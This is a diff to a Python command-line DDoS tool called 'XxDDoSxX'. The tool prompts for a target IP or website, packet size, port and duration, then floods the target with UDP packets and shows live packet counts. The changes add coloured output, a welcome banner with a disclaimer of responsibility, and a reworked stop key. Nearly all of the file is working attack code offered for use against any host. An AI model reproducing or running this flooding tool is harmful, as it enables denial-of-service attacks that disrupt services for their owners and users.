@@ -3,13 +3,22 @@ import socket, os , datetime, sys, threading, select, time as t
 # Setup de print couleur
 def printRed(text):
  print("\033[91m{}\033[00m".format(text))
+
+def printGreen(text):
+ print("\033[92m{}\033[00m".format(text))
+
+def printYellow(text):
+ print("\033[93m{}\033[00m".format(text))
+
+def printInfos(text, text1):
+ print("\033[92m{}\033[00m".format(text), "\033[94m{}\033[00m".format(text1))
  
 def inputYellow(text):
  value = input("\033[93m{}\033[00m".format(text))
  return value
  
 def printPurple(text):
- print("\033[95m{}\033[00m".format(text))
+ print("\033[95m{}\033[00m".format(text), end="")
  
 def printLightPurple(text):
  print("\033[94m{}\033[00m".format(text))
@@ -32,55 +41,83 @@ def style():
 	printLightPurple("                           //XxDDoSxX by C0C0\\\\") 
 	printCyan("===========================================================================")
 
+# Focntion de bienvenue
+def welcome():
+	style()
+	printRed("\n                                 Welcome !\n                         Press 'enter' for continue\n")
+	printLightPurple("[Infos :]\n")
+	printPurple("  [+]")
+	printInfos(" Github :","https://github.com/XxC0C0xX")
+	printPurple("  [+]")
+	printInfos(" Version :","1.5")
+	printPurple("  [+]")
+	printInfos(" Latest update :", "07/12/2023")
+	printPurple("  [+]")
+	printRed(" I am not responsible for your actions\n")
+	printLightPurple("[Steps :]\n")
+	printPurple("  [1]")
+	printYellow(" IP or WebSite Adress")
+	printPurple("  [2]")
+	printYellow(" Bytes send")
+	printPurple("  [3]")
+	printYellow(" Port")
+	printPurple("  [4]")
+	printYellow(" Time in minutes")
+	printPurple("  [*]")
+	printYellow(" Relaunch")
+
+
+
 # Fonction pour le chargement
 def loading():
 	style()
 	printRed("                             Starting attack")
-	printLightPurple("                           ____________________")
-	printLightPurple("                          |          0%        |")
-	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	printGreen("                           ____________________")
+	printGreen("                          |          0%        |")
+	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
 	t.sleep(1)
 	style()
 	printRed("                             Starting attack.")
-	printLightPurple("                           ____________________")
-	printLightPurple("                          |==       10%        |")
-	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	printGreen("                           ____________________")
+	printGreen("                          |==       10%        |")
+	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
 	t.sleep(1.2)
 	style()
 	printRed("                             Starting attack..")
-	printLightPurple("                           ____________________")
-	printLightPurple("                          |=====    25%        |")
-	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	printGreen("                           ____________________")
+	printGreen("                          |=====    25%        |")
+	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
 	t.sleep(1.1)
 	style()
 	printRed("                             Starting attack...")
-	printLightPurple("                           ____________________")
-	printLightPurple("                          |======== 40%        |")
-	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	printGreen("                           ____________________")
+	printGreen("                          |======== 40%        |")
+	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
 	style()
 	printRed("                             Starting attack")
-	printLightPurple("                           ____________________")
-	printLightPurple("                          |=========55%        |")
-	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	printGreen("                           ____________________")
+	printGreen("                          |=========55%        |")
+	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
 	t.sleep(1)
 	style()
 	printRed("                             Starting attack.")
-	printLightPurple("                           ____________________")
-	printLightPurple("                          |=========70%=       |")
-	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	printGreen("                           ____________________")
+	printGreen("                          |=========70%=       |")
+	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
 	t.sleep(1.3)
 	style()
 	printRed("                             Starting attack..")
-	printLightPurple("                           ____________________")
-	printLightPurple("                          |=========85%====    |")
-	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	printGreen("                           ____________________")
+	printGreen("                          |=========85%====    |")
+	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
 	t.sleep(1.4)
 	style()
 	printRed("                             Starting attack...")
-	printLightPurple("                           ____________________")
-	printLightPurple("                          |=========100%=======|")
-	printLightPurple("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
+	printGreen("                           ____________________")
+	printGreen("                          |=========100%=======|")
+	printGreen("                           ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
 	t.sleep(1.2)
+
 
 
 # Setup de now (Heure actuelle en secondes)
@@ -95,8 +132,11 @@ def now():
 def ddos():
 	
 	
+	welcome()
+	infos = input()
 	style()
-	ipSend = inputYellow("\n[1] IP or WebSite Adress : ")
+	printPurple("\n[1]")
+	ipSend = inputYellow(" IP or WebSite Adress : ")
 	while True:
 		if ipSend != "":
 			if ipSend[0:8] == "https://":
@@ -115,12 +155,14 @@ def ddos():
 			except:
 				pass
 		style()
-		printRed("\n                      Error : IP Adress is Not Found")
-		ipSend = inputYellow("\n[1] IP or WebSite Adress : ")
+		printRed("\n                      Error : IP Adress is not found")
+		printPurple("\n[1]")
+		ipSend = inputYellow(" IP or WebSite Adress : ")
 
 	# Vérifie que bytes est dans [1 ;65507]
-	style()		
-	bytes = inputYellow("\n[2] Bytes Send (int, Min : 1, Max : 65507) : ")
+	style()
+	printPurple("\n[2]")
+	bytes = inputYellow(" Bytes send (int, Min : 1, Max : 65507) : ")
 	while True:
 		try:
 			bytes = int(bytes)
@@ -130,11 +172,13 @@ def ddos():
 				pass
 		style()
 		printRed("\n                  Error : Number of Bytes is not interval")
-		bytes = inputYellow("\n[2] Bytes Send (int, Min : 1, Max : 65507) : ")
+		printPurple("\n[2]")
+		bytes = inputYellow(" Bytes send (int, Min : 1, Max : 65507) : ")
 	
 	# Vérifie que port est dans [1 ;65534]
 	style()
-	port = inputYellow("\n[3] Port (int, Min : 1, Max : 65534) : ")
+	printPurple("\n[3]")
+	port = inputYellow(" Port (int, Min : 1, Max : 65534) : ")
 	while True:
 		try:
 			port = int(port)
@@ -144,12 +188,14 @@ def ddos():
 				pass
 		style()
 		printRed("\n                  Error : Number of Port is not interval")
-		port = inputYellow("\n[3] Port (int, Min : 1, Max : 65534) : ")
+		printPurple("\n[3]")
+		port = inputYellow(" Port (int, Min : 1, Max : 65534) : ")
 
 	# Vérifie que time est dans [1 ;1439]
 	style()	
 	global time
-	time = inputYellow("\n[4] Time in Minutes (int, Min : 1, Max : 1439) : ")
+	printPurple("\n[4]")
+	time = inputYellow(" Time in Minutes (int, Min : 1, Max : 1439) : ")
 	while True:
 		try:
 			time = int(time)
@@ -159,32 +205,31 @@ def ddos():
 		except ValueError:
 				pass
 		style()
-		printRed("\n                  Error : Number of Time is not interval")
-		time = inputYellow("\n[4] Time in Minutes (int, Min : 1, Max : 1439) : ")
-		
+		printRed("\n            Error : Number of Time is not interval")
+		printPurple("\n[4]")
+		time = inputYellow(" Time in Minutes (int, Min : 1, Max : 1439) : ")
 
 	# Fonction pour lire la console sans interrompre
 	def inputNoInterrupted():
 		global exit, time
 		timeLocal = time
-		input, e, o = select.select( [sys.stdin], [], [], 		int(timeLocal) )
+		input, e, o = select.select([sys.stdin], [], [], int(timeLocal))
 
 		if input:
-		  while timeLocal != 0:
-			  input=sys.stdin.readline().strip()
-			  for i in range(len(input)):
-			  	if input[i] == "e":
-		  			exit = input[i]
-	 		 		return exit
- 	
- 	#Définition de thread
+			while timeLocal != 0:
+				input = sys.stdin.readline().strip()
+				if input == "":
+					return exit
+
+	# Définition de thread
 	thread = threading.Thread(target=inputNoInterrupted)
 
-	# Message avec nombre de bytes
-	send = "0"*bytes
 
 	# Chargement
 	loading()
+
+	# Message avec nombre de bytes
+	send = "0"*bytes
 
 	# Création d'un paquet UDP
 	sock = socket.socket(socket.AF_INET, 	socket.SOCK_DGRAM)
@@ -199,10 +244,9 @@ def ddos():
 	PacketPerSecondTotal = 0
 	timeEnd = 0
 	sendTime = now()
-	
+
 	# Début du thread
 	thread.start()
-
 
 	
 	# Coeur du DDoS
@@ -224,9 +268,11 @@ def ddos():
 		# Affichage des logs toutes les secondes
 		if sendTime != now():
 			style()
-			printRed("\n                        Enter 'e' for stop attack")
-			logs = "\n["+str(hoursPrint)+":"+str(minutePrint)+":"+str(secondsPrint)+"] Bytes send "+str(bytes)+" Adress "+str(ipSend)+" Port "+str(port)+" Packets "+str(PacketPerSecond)
-			printPurple(logs)
+			printRed("\n                      Press 'Enter' for stop attack")
+			logsHours = "\n["+str(hoursPrint)+":"+str(minutePrint)+":"+str(secondsPrint)+"]"
+			logs = " Adress "+str(ipSend)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(PacketPerSecond)
+			printPurple(logsHours)
+			printGreen(logs)
 			PacketPerSecondTotal += PacketPerSecond
 			PacketPerSecond = 0
 			sendTime = now()
@@ -234,11 +280,11 @@ def ddos():
 			
 		# Fin de l'attaque avec options pour relancer
 		global exit
-		if nowSecond == now() or exit == "e":
-			
+		if nowSecond == now() or exit == "":
+
 			# Fin du thread
 			thread.join()
-			exit = ""
+			exit = "0"
 			
 				# Conversion du temps d'attaque total en hh:mm:ss
 			(hoursPrintTotal, secondsPrintTotal) = divmod(timeEnd, 3600)
@@ -249,9 +295,12 @@ def ddos():
 			
 			style()
 			printRed("\n                                 Finish !\n                               Total logs : ")
-			logsTotal = "\n["+str(hoursPrintTotal)+":"+str(minutePrintTotal)+":"+str(secondsPrintTotal)+"] Bytes send "+str(bytes)+" Adress "+str(ipSend)+" Port "+str(port)+" Packets "+str(PacketPerSecondTotal)
-			printPurple(logsTotal)
-			relaunch = inputYellow("\n[*] Continue ? (y/n) : ")
+			logsTotalHours = "\n["+str(hoursPrintTotal)+":"+str(minutePrintTotal)+":"+str(secondsPrintTotal)+"]"
+			logsTotal = " Adress "+str(ipSend)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(PacketPerSecondTotal)
+			printPurple(logsTotalHours)
+			printGreen(logsTotal)
+			printPurple("\n[*]")
+			relaunch = inputYellow(" Relaucnh ? (y/n) : ")
 			while True:
 				if relaunch == "y" or relaunch == "Y" or relaunch == "yes" or relaunch == "Yes":
 					ddos()
@@ -259,12 +308,12 @@ def ddos():
 					style()
 					printRed("\n                                   Bye !")
 					t.sleep(2)
-					os.system("clear")
 					sys.exit()
 				else:
 					style()
 					printRed("\n                            Error : Answer y/n")
-					relaunch = inputYellow("\n[*] Continue ? (y/n) : ")
+					printPurple("\n[*]")
+					relaunch = inputYellow(" Relaunch ? (y/n) : ")
 					
 	#Fermeture du paquet
 	sock.close()
